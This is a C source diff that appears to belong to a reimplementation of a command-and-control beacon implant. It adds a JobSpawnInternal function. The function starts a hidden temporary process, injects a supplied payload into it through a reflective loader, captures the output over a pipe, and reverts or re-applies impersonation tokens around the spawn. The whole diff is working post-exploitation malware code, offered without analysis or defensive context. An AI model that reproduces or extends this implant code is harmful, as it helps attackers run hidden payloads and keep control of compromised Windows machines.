@@ -1,6 +1,7 @@
 #include "pch.h"
 
 #include "beacon.h"
+#include "identity.h"
 #include "pipe.h"
 
 
@@ -199,4 +200,38 @@ void JobRegister(char* buffer, int size, BOOL impersonate, BOOL isMsgMode)
 	}
 
 	JobRegisterPipe(hPipe, pid32, callbackType, description, isMsgMode);
+}
+
+void JobSpawnInternal(int callbackType, int waitTime, int reflectiveLoaderOffset, char* payload, int payloadLength, char* argument, int argumentLength, char* description, int descriptionLength, BOOL x86, BOOL ignoreToken)
+{
+	IdentityConditionalRevert(ignoreToken);
+
+	STARTUPINFOA si = { sizeof(si) };
+	PROCESS_INFORMATION pi = { 0 };
+	SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
+
+	HANDLE hRead, hWrite;
+	CreatePipe(&hRead, &hWrite, &sa, 0x100000);
+	GetStartupInfoA(&si);
+	si.hStdOutput = hWrite;
+	si.hStdError = hWrite;
+	si.hStdInput = NULL;
+	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+	si.wShowWindow = SW_HIDE;
+
+	if (BeaconSpawnTemporaryProcess(x86, ignoreToken, &si, &pi))
+	{
+		Sleep(100);
+
+		BeaconInjectTemporaryProcess(&pi, payload, payloadLength, reflectiveLoaderOffset, argument, argumentLength);
+
+		if (waitTime)
+		{
+			PipeWaitForData(hRead, waitTime, 500);
+		}
+
+		JobRegisterProcess(&pi, hRead, hWrite, description);
+	}
+
+	IdentityConditionalImpersonate(ignoreToken);
 }
